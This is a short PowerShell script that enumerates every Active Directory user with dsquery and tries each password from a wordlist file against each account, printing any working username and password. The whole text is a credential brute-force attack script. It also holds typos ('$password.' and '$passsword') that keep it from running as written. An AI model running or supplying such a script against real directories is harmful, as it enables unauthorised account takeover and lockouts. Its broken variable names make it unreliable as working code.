dsquery user -limit 0 > users
foreach ($fdn in Get-Content .\users)
{
	$results = dsget user $fdn -samid
	$samid = $results[1].replace(" ","")
	Write-Host $samid
	foreach ($password. in get-content .\password.txt)
	{
		$password = $passsword.replace(" ","")
		dsget user -u $samid -p $password > $null
		if ($?) {
			write-host "Account: $samid Password: $password "
		}
	} 			
} 